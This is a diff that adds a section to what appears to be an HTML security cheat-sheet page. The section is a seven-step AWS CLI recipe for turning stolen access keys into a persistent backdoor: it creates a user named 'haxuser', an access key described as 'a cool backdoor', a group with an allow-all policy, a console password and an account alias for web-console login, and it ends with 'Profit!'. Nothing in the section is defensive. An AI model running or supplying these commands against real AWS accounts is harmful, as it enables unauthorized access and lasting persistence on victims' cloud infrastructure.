@@ -161,6 +161,40 @@
 </ul></li>
 </ul>
 
+<h3 id="gaining-access-to-aws-web-console-via-stolen-access-keys-awscli-in-7-steps">Gaining Access to AWS Web Console via stolen access keys &amp; awscli in 7 steps</h3>
+
+<p>Step 1) Create a temp user</p>
+
+<p><code>aws iam create-user --user-name haxuser</code></p>
+
+<p>Step 2) Create access key for new temp user (can skip this step but its a cool backdoor)</p>
+
+<p><code>aws iam create-access-key --user-name haxuser</code></p>
+
+<p>Step 3) Create a new temp group for new temp user</p>
+
+<p><code>aws iam create-group --group-name haxuser</code></p>
+
+<p>Step 4) Assign group policy for temp group granting all access</p>
+
+<p><code>aws iam put-group-policy --group-name haxuser --policy-name haxuser --policy-document '{&quot;Version&quot;:&quot;2012-10-17&quot;, &quot;Statement&quot;: [{&quot;Sid&quot;: &quot;Stmt1437414476731&quot;, &quot;Action&quot;: &quot;*&quot;, &quot;Effect&quot;: &quot;Allow&quot;, &quot;Resource&quot;: &quot;*&quot; }]}'</code></p>
+
+<p>Step 5) Add temp user to temp group</p>
+
+<p><code>aws iam add-user-to-group --group-name haxuser --user-name haxuser</code></p>
+
+<p>Step 6) Create a login profile for temp user with a SUPER COOL password</p>
+
+<p><code>aws iam create-login-profile --user-name haxuser --password 'SuperDuperCoolPassword'</code></p>
+
+<p>Step 7) Create an account alias so you can access the account web console</p>
+
+<p><code>aws iam create-account-alias --account-alias haxuseralias</code></p>
+
+<p>Now you can login directly using the new alias! Browse: hxxps://haxuseralias.signin.aws.amazon.com/console/</p>
+
+<p>Profit!</p>
+
   </article>
 </section>
 
